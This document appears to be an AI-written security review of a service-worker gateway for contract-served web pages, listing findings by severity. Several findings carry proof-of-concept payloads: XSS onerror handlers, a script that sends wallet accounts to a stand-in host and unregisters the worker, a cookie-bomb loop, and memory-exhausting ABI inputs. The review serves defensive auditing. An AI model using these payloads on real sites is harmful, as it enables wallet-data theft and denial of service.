# gw44 security review — opus leg

**What could and could not be done.** I read all twelve scoped files in full. There was no browser,
no esbuild and no network, so nothing ran inside a real service worker, and nothing that depends on
esbuild's output (how it escapes `</script`, whether it drops the unused parser) was checked. Node
v24 was available, so I ran the scoped TypeScript itself (`abi.ts` and `target.ts`, imported
read-only) from a scratch directory outside the tree, then deleted that directory. Three
findings were checked that way and are marked **[run]**. Everything else comes from reading the
code. The tree is unchanged (`git status` is clean).

## Severity scale

- **Critical**: anyone can run script on, or serve content as, an origin or contract the build
  did not configure, with no help from the visitor.
- **High**: script runs on a gateway origin against a protection the contract asked for, or one
  origin's authority (storage, worker, wallet or browser permissions) is handed to a different
  contract.
- **Medium**: a hostile contract, endpoint or sibling origin can deny service to more than itself,
  exhaust resources, or weaken another origin's state; or a security property the code claims is
  false.
- **Low**: a narrow precondition, availability within one origin, a privacy leak to a party already
  trusted, or hardening at the build input.
- **Info**: correct behaviour worth recording, or a comment that does not match the code and
  has no security effect.

---

## H-1 — The no-worker path drops every header the contract set, and renders any path, not only the root

**Location:** `src/adapters/sw/boot.ts:36-45` (header lookup at `:40`, write at `:43-45`); compare `src/core/resolve.ts:276-287`
**Severity:** High

`renderInline` calls `resolve()` for whatever target the URL names. That includes `request()` for
any non-root path, even though the comment at `:33-34` says "only the root". It then keeps only
`content-type` from the result. If the type starts with `text/html`, the bytes go to
`document.write`, so they run as a live document on the gateway origin. Everything else
`resolve()` allowed through is thrown away: `content-security-policy`, `x-frame-options`,
`cross-origin-opener-policy`, `cross-origin-embedder-policy`, `permissions-policy`,
`referrer-policy`, `content-disposition`. `nosniff` is also lost. The page's real headers are the
static host's headers for `index.html` / `404.html`.

A contract that serves untrusted HTML (user profiles, comments, NFT metadata rendered as a page)
and contains it with `Content-Security-Policy: sandbox` or `script-src 'none'` is protected when the
worker serves the page. It is not protected on this path.

`Content-Disposition: attachment` is lost the same way. A resource the contract meant to be
downloaded is rendered instead.

This path is reached when there is no `serviceWorker` in `navigator`. It is also reached when
`register()` rejects or takes more than 4 s (`boot.ts:68-73, 82-83`): Firefox private windows, and
third-party iframes where the browser blocks partitioned storage. It is also reached when the loop
guard trips (`:65`, see L-1). An attacker can arrange the iframe case.

**Repro:** a contract whose `request(["u","1"],[])` returns `(200, "<img src=x onerror=alert(document.domain)>", [["content-type","text/html"],["content-security-policy","sandbox; script-src 'none'"]])`. Open `https://<addr>.1.<host>/u/1` in a browser where registration fails, or inside an `<iframe>` on an attacker page in a browser that blocks third-party storage. The handler runs on the gateway origin at `boot.ts:44`.

Also on this path: `TextDecoder()` at `:41` always decodes as UTF-8 and ignores any charset the
contract declared. That is a correctness issue, not a security one.

## H-2 — Several chains of one project share one origin; the code says their storage stays separate

**Location:** `src/core/target.ts:20-24` (claim), `src/core/target.ts:169-200` (`pinnedTarget`), `src/adapters/sw/boot.ts:70` (one registration, scope `/`)
**Severity:** High. Medium if every chain's contract is guaranteed to share one owner key and one upgrade path; the build does not check that.

The comment on `Pins` says "the project's storage stays separate by chain". It does not.
`/1/…` and `/10/…` are one origin, so they share:

- `localStorage`, `IndexedDB`, Cache Storage, cookies, and the boot counter in `sessionStorage`;
- one service-worker registration. Either chain's document can `unregister()` it, and that
  affects both;
- same-origin DOM access. `window.open('/1/')` from the chain-10 document returns a window it can
  script, and it can read any `/1/…` response with `fetch`;
- every permission granted per origin: notifications, camera, clipboard, persistent storage.
  The biggest one is **wallet (EIP-1193) connection approvals**, which wallets key by origin and
  show to the user as the origin. Once a user connects a wallet to the chain-1 app, the chain-10
  contract's document can call `eth_requestAccounts` / `eth_sendTransaction` silently, and the
  wallet labels the request as coming from the same trusted origin.

The practical result: the gateway origin is only as safe as the least-protected contract in
`gw44.json`. For example, a testnet deployment whose owner key is a hot dev key, or an upgradeable
proxy on a minor chain, can take over the mainnet app's origin.

**Repro:** a build with `{"default":"1","contracts":{"1":A,"10":B}}`. B's `html()` returns `<script>ethereum.request({method:'eth_accounts'}).then(a=>fetch('https://x/'+a)); localStorage.getItem('<chain-1 app key>'); navigator.serviceWorker.getRegistration().then(r=>r.unregister())</script>`. A visitor who connected their wallet at `/1/` and later opens `/10/` hands over their accounts and A's stored state, and loses the worker for both chains.

## M-1 — The ABI decoder lets headers alias one string, so memory grows about 128× the return data

**Location:** `src/core/abi.ts:116-120`; extra copies at `src/core/resolve.ts:277` (`toLowerCase` on every key)
**Severity:** Medium **[run]**

`MAX_HEADERS = 64` caps how many headers there are, not how many bytes they decode to. Each
header's pair offset, and the key and value offsets inside each pair, can all point at the same
`string` in the return data. Every bounds check passes. Each of the 128 `text.decode()` calls
then makes a new copy of that string. `resolve.ts:277` adds 64 more full-size copies for the
lower-cased keys, and `HEADER_VALUE.test` scans every value whose key is allowlisted.

Measured with the scoped `decodeRequestResult` under Node 24: a 4,196,608-byte return value
(64 headers, every key and value pointing at one 4 MiB string) decoded into **536,870,912 characters**.
RSS grew by **509 MB** in 0.5 s, before `resolve.ts` made its own copies.

In the worker, a few parallel subresource requests to such a path take the worker (and possibly
its renderer process) out of memory. In the multi-chain shape (H-2) the worker is shared, so one
chain's contract takes it down for every chain. In the no-worker path the same thing happens inside
the visible page.

**Repro:** `request()` returns the encoding of `(200, "", [(S,S)] × 64)`, where all 64 array offsets
point at one pair and that pair's two offsets both point at one 4 MiB string `S`. Request it ten
times from `<img>` tags on the contract's page.

## M-2 — Contracts in the unpinned host form share a registrable domain: cookie tossing and a cookie bomb against every contract

**Location:** `src/core/target.ts:57, 69-74` (host form under "any base")
**Severity:** Medium

Every contract is `<address>.<chain>.<base>`, so all of them are subdomains of one site. Unless
`<base>` is on the Public Suffix List, a document on any one of them can set cookies with
`Domain=<chain>.<base>` or `Domain=<base>`. The browser then sends those cookies to every other
contract's origin. Two effects:

1. **Cookie bomb, across contracts.** Enough large cookies on `Domain=<base>` push every later
   request from that browser to any `*.<base>` host past the static host's request-header limit.
   The host typically answers 400 or 431. The boot page never arrives on contracts the visitor
   has not opened yet, so they cannot boot. The worker update fetch for `/gw44-sw.js` goes to the
   static host, so updates fail too (whether it carries cookies is the spec's credentials mode;
   the navigations to the boot page certainly do).
2. **Cookie injection.** Cookie values set this way show up in every other contract's
   `document.cookie`.

The gateway never reads cookies, so code inside the worker cannot fix this. The defence is a PSL
entry for the base, or a base per contract. Nothing in the build or the parser checks or warns about
that.

**Repro:** contract A's `html()` runs `for(let i=0;i<40;i++)document.cookie='b'+i+'='+'x'.repeat(4000)+';domain=<base>;path=/;max-age=31536000'`. After that, a first visit to `https://<B>.1.<base>/` gets an error from the static host instead of the boot page.

## M-3 — Endpoint response size: `hexToBytes` overflows the regex stack at about 4 MiB, half the cap; every endpoint is then downloaded and the visitor gets 502 "upstream"

**Location:** `src/core/abi.ts:13` (regex), reached from `src/adapters/rpc/fetch.ts:204`; failover loop at `fetch.ts:212-219`; cap at `fetch.ts:181`
**Severity:** Medium (availability, with traffic multiplied by the number of endpoints) **[run]**

`/^0x([0-9a-fA-F]{2})*$/` backtracks through a capturing group, once per byte. In V8 it throws
`RangeError: Maximum call stack size exceeded` once the return data passes **4,193,280 bytes**. I
measured that boundary. `--stack-size` did not move it, because the limit is irregexp's backtrack
stack. The default `maxBytes` of 16 MiB allows return data up to 8 MiB.

The `RangeError` is thrown inside `callOne`. The bare `catch` in `call` treats it as that
endpoint's failure and moves to the next one. So every return value between about 4 and 8 MiB:

- downloads up to 16 MiB from **each** configured endpoint in turn;
- holds the 16 MiB string plus the 32 MiB UTF-16 `out` built up in `readCapped` (`fetch.ts:161`),
  once for each endpoint;
- ends as `502 no RPC endpoint for chain N answered`, which blames the endpoints wrongly.

A contract can do this to any of its own paths. In the multi-chain shape it does it to the shared
worker. A hostile endpoint can do it by returning a 15 MiB `result`, which costs every later
endpoint a full download as well.

**Repro:** `{"jsonrpc":"2.0","id":1,"result":"0x" + "00"×(5·2^20)}` from the first endpoint. Every
endpoint is tried, and the visitor gets 502 instead of the document.

## M-4 — The root document cannot carry any header, so it is always frameable and has no CSP

**Location:** `src/core/resolve.ts:261-265`, `src/core/resolve.ts:235-239`
**Severity:** Medium

`html()` returns only bytes, so the root response is always exactly `content-type`,
`cache-control` and `nosniff`. The gateway adds no `frame-ancestors` / `X-Frame-Options` default.
A contract has no way to protect its own root document, which is the dapp's main page:
`frame-ancestors` and `X-Frame-Options` are ignored in `<meta>`. Sub-paths can opt in through
`request()`; the root cannot.

So any site can frame the main page of every contract and overlay it (clickjacking: "Connect",
"Approve", "Sign"). In the no-worker path (H-1) the same is true of every path.

**Repro:** `<iframe src="https://<addr>.1.<host>/" style="opacity:0">` on an attacker page, placed over a
decoy button. The gateway sends no header to stop it.

## L-1 — The boot loop counter can be written by any document on the origin, and it accepts timestamps in the future

**Location:** `src/adapters/sw/boot.ts:20-30` (no lower bound at `:24`)
**Severity:** Low. Medium together with H-2 and H-1.

`gw44:boot` lives in the origin's `sessionStorage`, so the contract's own document can write it.
`Date.now() - at < WINDOW_MS` is also true for any `at` in the future. Each write is
`${n+1}:${Date.now()}`, so a large count carries forward to the next load within 10 s of the last
one. From a planted far-future value, the first uncontrolled load sets `n` to the planted count.
`"Infinity:0"` reads as count `Infinity` but at time 0, so it does not trip the guard.

A document can therefore unregister the worker and set `gw44:boot` to `"9:9e15"`. Its next reload
skips registration and goes straight to `renderInline`, and so does every later load in that tab.
On its own origin that only hurts the contract itself. In the multi-chain shape, chain 10's
document can push chain 1's pages onto the no-worker path for the rest of the tab session, and that
path drops chain 1's CSP (H-1).

**Repro:** in a document served at `/10/`: `navigator.serviceWorker.getRegistration().then(r=>r.unregister()); sessionStorage.setItem('gw44:boot','9:9000000000000000'); location='/1/u/1'`. Then `/1/u/1` is rendered by `document.write` with its headers dropped.

## L-2 — Any JSON-RPC error whose message contains "revert" stops failover

**Location:** `src/adapters/rpc/fetch.ts:166-168, 200, 216`
**Severity:** Low

`isRevert` also matches `/revert/i` anywhere in `error.message`. `RpcRevert` is re-thrown at once
and never reaches the next endpoint, and `resolve.ts:301-302` turns it into a 404. A broken or
rate-limiting first endpoint whose error text happens to contain "revert" makes every resource
404 instead of failing over. That gives no wrong document, just denial: the visitor sees
"does not serve this resource" while healthy endpoints exist. `code === 3` from any endpoint does
the same. The comment says a revert is "the contract's answer", but the code takes the endpoint's
word for it.

**Repro:** the first endpoint answers `{"jsonrpc":"2.0","id":1,"error":{"code":-32005,"message":"limit exceeded; request not reverted, retry later"}}`. Every path 404s and the second endpoint is never asked.

## L-3 — Failover has no memory, and a non-2xx body is never released

**Location:** `src/adapters/rpc/fetch.ts:212-219` (ordered and stateless), `fetch.ts:196` (non-OK body not cancelled), `fetch.ts:189`
**Severity:** Low

Every call starts at endpoint 0. A first endpoint that accepts the connection and never answers
costs **every** request 10 s, and a page with 50 subresources pays that 50 times concurrently. The
comment at `:174-179` documents the n × `timeoutMs` bound, but it does not say that nothing ever
learns which endpoint is dead.

At `:196`, a non-OK response throws without `res.body.cancel()`. The connection and the buffered
body stay alive until the `AbortSignal.timeout` fires (up to 10 s) or GC runs. A hostile endpoint
answering `429` with a slow, endless body holds one connection per request for the full timeout.
The same applies when `JSON.parse` or `hexToBytes` throws: the body has already been read by
then, but the 16 MiB string is held until the exception unwinds.

**Repro:** endpoint 0 answers `HTTP/1.1 503` and then sends one byte per second. Each call waits 10 s
on it before trying endpoint 1, with no memory between calls.

## L-4 — The worker does not reserve its own path, contrary to `config.ts`

**Location:** `src/adapters/sw/config.ts:26-27` (claim), `src/adapters/sw/sw.ts:162-175` (no `SW_PATH` check)
**Severity:** Low

`SW_PATH` is described as "reserved on every origin… a contract's own resource of this name is
shadowed". The fetch listener never compares against it. In the host form and the single-pin
shape, a document's `fetch('/gw44-sw.js')` or `<script src="/gw44-sw.js">` gets **the contract's**
`request(["gw44-sw.js"])`, with whatever content type the contract chose. In the multi-chain shape
the same request gets the worker's 404 (verified: `pinnedTarget` throws "no contract at this
path").

I found no takeover. Registration and update fetches skip the worker by spec, and every other path
on the static host is `404.html` as `text/html`, which `register()` rejects on MIME type. So a
contract cannot install its own worker. The risk is anything that assumes a same-origin read of
`/gw44-sw.js` returns the real worker (integrity checks, the planned purge or cache logic). That
assumption is false.

**Repro:** a contract that answers `request(["gw44-sw.js"])` with `(200, "/*fake*/", [["content-type","text/javascript"]])`. From its page, `fetch('/gw44-sw.js')` returns `/*fake*/`.

## L-5 — Every query string is sent to the public RPC endpoints

**Location:** `src/core/target.ts:67, 170` → `src/core/abi.ts:65-69` → `src/adapters/rpc/fetch.ts:188`
**Severity:** Low

Every `?key=value` on every request goes into the `eth_call` calldata in plaintext. That includes
values meant for the client only (`?code=` / `?state=` from an OAuth return, invite tokens,
`?session=`). The RPC provider logs them, alongside the request's `Origin`, which names the
contract. For the root the params are encoded nowhere (`html()`), but every sub-path, and every
redirect that carries `url.search`, sends them.

**Repro:** `https://<addr>.1.<host>/callback?code=SECRET`. The endpoint receives `SECRET` UTF-8
encoded in the calldata of `request(["callback"],[("code","SECRET")])`.

## L-6 — Build: the `</script` guard is case-sensitive and ignores `<!--`

**Location:** `tools/build.ts:260`
**Severity:** Low (needs a hostile or careless build input; not verified against esbuild's output)

`replaceAll("</script", "<\\/script")` matches lower case only. The HTML tokenizer ends a script on
`</SCRIPT`, `</Script` and so on. `<!--` followed by `<script` inside the script switches the
tokenizer into the "double-escaped" state, and then the real `</script>` no longer closes it. The
only data in the boot bundle that comes from outside the source is the `define` values: the
endpoint URLs from the chains file and, in pinned builds, the pins (pins are validated, endpoints
are not). If esbuild does not escape those sequences in string literals itself (I could not check
that offline), an endpoint string such as `https://rpc.example/</SCRIPT><script>…` puts markup
into `index.html` and `404.html`.

**Repro:** `chains.json` = `{"1":["https://rpc.example/</SCRIPT><img src=x onerror=alert(1)>"]}`. Check whether `dist/index.html` contains a closing `</SCRIPT>` before the end of the bundle.

## L-7 — Build: the chains file is never validated

**Location:** `tools/build.ts:206, 216, 220-229, 243`; consumers `src/adapters/rpc/fetch.ts:208, 210-212`
**Severity:** Low

`chains.json` is compiled into the worker as is. Contracts get `CHAIN` and `ADDRESS` checks;
endpoints get nothing:

- `http:` endpoints are accepted. From an `https:` worker they are blocked as mixed content,
  so they fail quietly and silently shrink the failover list. On a loopback deployment they work
  in plaintext.
- A string instead of an array (`{"1":"https://rpc"}`) passes `supports()` because
  `.length > 0`. Then `for…of` tries **each character** as an endpoint.
- A `__proto__` key survives `JSON.parse`/`JSON.stringify` and becomes `{"__proto__":…}` in the
  `define`d object literal, which sets the prototype of `CHAINS`. Numeric chain ids then resolve
  through the prototype (for example to an array's elements).
- In a pinned build, `[]` passes the "chains file carries it" check at `:224`, and every request
  then gets 404 `unknown-chain`.

**Repro:** `GW44_PIN=1:0x…` with `chains.json` = `{"1":[]}`. The build succeeds, and every URL answers `gw44: chain 1 is not configured on this gateway`.

## L-8 — The host form gives one contract more than one origin

**Location:** `src/core/target.ts:66-74`
**Severity:** Low

A trailing-dot FQDN, `<addr>.1.<base>.`, still parses as the host form (verified), but it is a
different origin from `<addr>.1.<base>`. The same contract therefore has two origins, with split
storage and a separate worker, wallet connection and permission state. A link to the dotted form
looks the same to a user and reaches a context where the contract's earlier state, and any
permissions the user meant to revoke, do not apply. Ports (`:8443`) do the same if the host
answers on them. The `CHAIN` regex does stop leading zeros from creating more origins.

**Repro:** `https://<addr>.1.<base>./` serves the same contract with empty storage.

---

## Info

- **I-1 — Which contract a URL reaches.** I traced every branch.
  - **Pinned, one contract:** the hostname is never read, and every path is that contract's
    resource. A path in the path form (`/5/0xB…/`) is just a resource.
  - **Pinned, several chains:** only `Object.hasOwn(pins.contracts, first)` reaches a
    contract, and the keys are digits checked by `CHAIN`. Decoding happens before the check, so
    `/%31/` reaches chain 1 under a non-canonical prefix, which harmlessly duplicates the URL
    space. `//evil.com` gives `first === ""`, which becomes the 302 to `/1/` (verified).
  - **Unpinned:** host form, or the path form behind `isLoopback(hostname)`.

  I found no URL that reaches an unconfigured contract in a pinned build. Because `__GW44_PINNED__`
  is a constant, esbuild should drop the unused parser (`config.ts:110-112`). If it does not,
  nothing changes: a pinned `targetOf` cannot call `parseTarget`. The unpinned bundle shipped to a
  public host still contains the loopback path form, but a public hostname cannot satisfy
  `isLoopback`.
- **I-2 — Redirects.** All three redirects are origin-relative and start with `/<digit>`.
  `parseTarget` reuses the raw pathname, and `pinnedTarget` uses a decoded segment that has
  already been checked against the configured keys. `new URL(redirect, url)` (`sw.ts:150`) and
  `location.replace` (`boot.ts:61`) cannot leave the origin or the prefix. The query is kept, and
  the fragment is kept by the browser or explicitly by `boot.ts:61`.
- **I-3 — `resolve.ts:270` comment vs code.** The comment says 3xx-without-`Location` is not a
  document, but 300–399 is accepted, and `location` is not on the allowlist, so every contract 3xx
  is an empty-bodied, non-redirecting response. Not a security problem.
- **I-4 — `access-control-allow-origin` on the allowlist** has no effect in this adapter. A
  cross-origin request to the gateway origin is not handled by this origin's worker; it reaches the
  static host. It matters only in other adapters (out of scope).
- **I-5 — Contract-chosen `content-type`** can turn any path into `text/html`, SVG or XHTML on
  the contract's origin. That is inherent when the origin is the contract's own, and becomes
  H-2 when it is shared.
- **I-6 — Percent-encoded slashes.** `/a%2Fb` becomes resource `["a/b"]`, which differs from
  `["a","b"]` for the contract but not necessarily for its router, while the browser resolves
  relative URLs differently for the two. That is a path-confusion risk for contracts that
  join segments.
- **I-7 — Fetch listener.** Non-GET/HEAD and cross-origin requests go to the network. HEAD
  gets a full body, which the browser strips. `Range` is ignored, so the whole body comes back
  with 200. Navigations and subresources are handled the same way. The `fetch(url)` fallback at
  `sw.ts:148` drops the original request's mode, credentials and headers, but the listener's own
  `named` check makes it unreachable.
- **I-8 — A redirect loop is possible on some hosts.** `boot.ts:61` runs before the attempt
  counter. On a host that strips trailing slashes (`/1/` → `/1`), the boot redirect and the host's
  redirect loop forever.
- **I-9 — Mislabelled error.** A `not-found` thrown by `pinnedTarget` for an unconfigured first
  segment is shown on the boot page as "gw44: malformed URL" (`boot.ts:62-63`).
